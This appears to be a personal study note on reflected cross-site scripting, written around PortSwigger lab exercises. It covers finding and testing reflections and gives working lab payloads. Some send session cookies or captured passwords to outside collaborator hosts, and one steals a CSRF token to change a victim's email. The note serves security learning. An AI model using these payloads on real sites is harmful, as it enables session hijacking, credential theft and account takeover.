---
sticker: emoji//2705
---
Where a malicious script is **injected into the current HTTP request**, which unsafely **includes that data within the immediate response**. Can be used to perform any action (view, exfiltrate, change data) within the context of the victim's user account.

E.g. injecting a `<script>` into a URL parameter, like:
`https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>`

**Requires an external delivery mechanism**; i.e. placing links on an adversary-controlled website, another website that allows generated content, or via an email link, tweet or other message.

### Finding & testing Reflected XSS:
1. **Submit random alphanumeric values for every entry point,** determining whether the value is reflected in the response. Includes:
	1. Parameters or other data in URL query string (can just add `?'onclick(alert(1))` if url is reflected in the `DOM`, for example.)
	2. Message Body
	3. URL file path
	4. HTTP headers (less severe)
	5. Conside using Intruder, with [alphanumeric payloads](https://portswigger.net/burp/documentation/desktop/tools/intruder/payloads/types#numbers) (8+ characters), & [grep payloads settings](https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/settings#grep-payloads) to flag responses with the value.
2. **Determine the reflection context for each location within the response**: (text between HTML tags, quoted `tag` attributes, JavaScript strings, etc.)
3. **Based on the context, test candidate XSS payloads** - modify the request to insert the candidate payload *after* inserted random value, set the random value as the search term, then Burp Repeater will highlight each location where the search term appears, letting you quickly locate the reflection. **Lots of trial and error based on filters & contexts - see [here](https://portswigger.net/web-security/cross-site-scripting/contexts)**.
4. **Test the attack in a browser** to check if injected JavaScript is indeed executed.


### Reflected XSS Exploitation Examples:
#### Cookie Stealing: 
Often sending victim's cookies to adversary domain, then reusing them to hijack their session.
**Limitations:**
- Requires victim to be logged in
- `HttpOnly` flag may prevent cookie access with JS
- Sessions may be bound by additional factors; user's IP address, server-side controls.
- Session may time out before being able to be hijacked.
##### [Lab](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies):
``` js
<script>
fetch(`https://u94cmk0nlm98t17isx9fgp6bo2utip6e.oastify.com`, {method: 'POST',mode: 'no-cors',body:document.cookie});
</script>

<a href="javascript:fetch(`https://vba1n16svaaay7eenol75yhez55wtnhc.c.ccxsta.com`, {method: 'POST',mode: 'no-cors',body:document.cookie});">

fetch(`https://vba1n16svaaay7eenol75yhez55wtnhc.c.ccxsta.com`, {method: 'POST',mode: 'no-cors',body:document.cookie});
```

---
#### Credential/data exfiltration:
Could create a phishing login page, or a `username`/`password` input to exploit & exfiltrate auto-filled credentials (from password managers, etc.).
##### [Lab](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords):
To auto-submit values entered into `username` and `password` input fields on a page, use:
``` html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://u94cmk0nlm98t17isx9fgp6bo2utip6e.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

---
#### Bypassing CSRF protections:
XSS allows bypassing CSRF protections by allowing attackers to **both** (1) **send arbitrary requests** & (2) **read/receive the responses**. 
E.g. if logged-in users can change their email address **without** re-entering their password, can use `XSS` to coerce user's browser to perform subsequent requests to:
- (1) generate & extract `csrf` token & 
- (2) submit it with new email to `email-change` endpoint 
*`CSRF` tokens do not prevent XSS, as XSS **lets attackers read token values directly from responses**.*

##### [Lab](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf): Exploiting XSS to bypass CSRF defenses
**Goal:** Steal the `CSRF` token via `XSS` to change the email of an account. *Need to: (1) load the user account page, (2) extract CSRF token, and (3) use it to change the victim's email address.*

**Email change process:**
Craft a payload using `XMLHttpRequest()` (JS) that:
1. Requests the `/my-account` page.
2. Retrieves the `csrf` token from the `/my-account` request body. *(from `<input required type="hidden" name="csrf" value="xxxxxxxxxx">`)*
3. Sends a subsequent `POST` request to `/my-account/change-email` with the `csrf` to change the email to an attacker-controlled one.

**Final Payload:**
``` js
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=juni@test.com')
};
</script>
```